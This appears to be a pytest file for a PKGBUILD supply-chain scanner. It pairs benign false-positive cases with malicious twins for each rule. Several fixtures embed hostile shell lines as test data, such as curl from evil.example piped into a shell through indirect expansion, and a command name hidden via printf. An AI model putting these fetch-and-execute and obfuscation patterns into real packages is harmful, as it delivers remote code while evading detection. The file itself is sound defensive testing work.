"""Malign false positives from the 2026-10-30 watcher window.

Each case pins the benign shape the rule fired on and the true-positive twin
the fix must keep.  Benign false positives (real bad practices) are not here:
matomo-bin's root hook, quikrun's unverified build script and the relic
themes' unpinned fixes source are packager work, not rule changes.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402
from trustsight.novelty import typosquat_target  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


# --- H080: indirect expansion as an argument, not a command ----------------

_TTF_H080 = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,10 @@\n"
    "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
    '+source=("x.tar.gz::https://github.com/a/b/archive/v1.tar.gz")\n'
    "+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n"
    "+prepare() {\n"
    "+  for _k in HINTING GASP_MODE; do\n"
    "+    printf '%s=%s\\n' \"$_k\" \"${!_k}\" >> \"$srcdir/.build_opts\"\n"
    "+  done\n"
    "+}\n"
)


def test_h080_does_not_fire_on_an_indirect_value():
    assert "H080" not in _ids(_TTF_H080)


def test_h080_still_fires_on_an_indirect_command():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,8 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        "+prepare() {\n"
        "+  P=bash\n"
        "+  C=curl\n"
        "+  $C https://evil.example/p.sh | ${!P}\n"
        "+}\n"
    )
    assert "H080" in _ids(diff)


# --- X002: a Python heredoc is not shell -----------------------------------

_PY_HEREDOC = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,13 @@\n"
    "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
    "+prepare() {\n"
    "+  python - <<'PY'\n"
    "+import sys\n"
    "+if sys.argv[1] == \"true\":\n"
    "+    print('on')\n"
    "+PY\n"
    "+}\n"
)


def test_x002_does_not_fire_on_a_python_heredoc():
    assert "X002" not in _ids(_PY_HEREDOC)


def test_x002_still_fires_on_an_unresolvable_command_word():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,8 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        "+prepare() {\n"
        "+  cmd=$(printf curl)\n"
        '+  "$cmd" https://evil.example/x\n'
        "+}\n"
    )
    assert "X002" in _ids(diff)


# --- H042: an unresolved expansion is not a hidden file --------------------

def test_h042_does_not_fire_on_a_suffix_expansion():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,8 @@\n"
        "+pkgname=leavepad-bin\n+pkgver=1\n+pkgrel=1\n"
        "+prepare() {\n"
        '+  sed -i "s/AppRun --no-sandbox/${pkgname%-bin}/g" '
        '"$(_get_app_dir)/${pkgname%-bin}.desktop"\n'
        "+}\n"
    )
    assert "H042" not in _ids(diff)


def test_h042_still_fires_on_a_hidden_drop():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,7 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        "+post_install() {\n"
        "+  touch /etc/.hidden-marker\n"
        "+}\n"
    )
    assert "H042" in _ids(diff)


# --- R152: a docs URL in a comment is not a source -------------------------

def test_r152_does_not_fire_on_an_install_comment():
    diff = (
        "--- a/p.install\n+++ b/p.install\n@@ -0,0 +1,4 @@\n"
        "+post_install() {\n"
        "+  # The official documentation is available at: "
        "https://invoiceninja.github.io/docs/self-host-installation/\n"
        "+  :\n"
        "+}\n"
    )
    assert "R152" not in _ids(diff)


def test_r152_still_fires_on_a_free_host_source():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,5 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        '+source=("https://evil.github.io/p.tar.gz")\n'
        "+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n"
    )
    assert "R152" in _ids(diff)


# --- H001: a mixed checksum array is not "disabled" ------------------------

_OLD_SUM = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n" + \
    " pkgname=p\n pkgver=1\n pkgrel=1\n" + \
    "-sha256sums=('" + "a" * 64 + "')\n"


def test_h001_does_not_fire_on_a_mixed_array():
    diff = _OLD_SUM + "+sha256sums=('" + "a" * 64 + "' 'SKIP')\n"
    assert "H001" not in _ids(diff)


def test_h001_still_fires_on_an_all_skip_array():
    diff = _OLD_SUM + "+sha256sums=('SKIP')\n"
    assert "H001" in _ids(diff)


# --- H003: an arch-keyed checksum backs the arch-keyed source --------------

def test_h003_does_not_fire_with_arch_keyed_b2sums():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,6 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        '+source_x86_64=("http://ftp.de.debian.org/x.deb")\n'
        "+b2sums_x86_64=('" + "a" * 128 + "')\n"
    )
    assert "H003" not in _ids(diff)


def test_h003_still_fires_on_an_unbacked_http_source():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
        '+source=("http://evil.example/x.tar.gz")\n'
    )
    assert "H003" in _ids(diff)


# --- D002: short names are insertion-distance noisy -----------------------

def test_d002_skips_short_insertion_lookalikes():
    assert typosquat_target("cre2", ["pcre2"]) is None


def test_d002_keeps_same_length_typos():
    assert typosquat_target("crul", ["curl"]) == "curl"


# --- H072: a written font is data, not a payload ---------------------------

def test_h072_ignores_data_artifacts():
    from trustsight.analysis.delivery import _is_data_artifact

    assert _is_data_artifact("GoogleSans-Regular.ttf")
    assert not _is_data_artifact("run.sh")
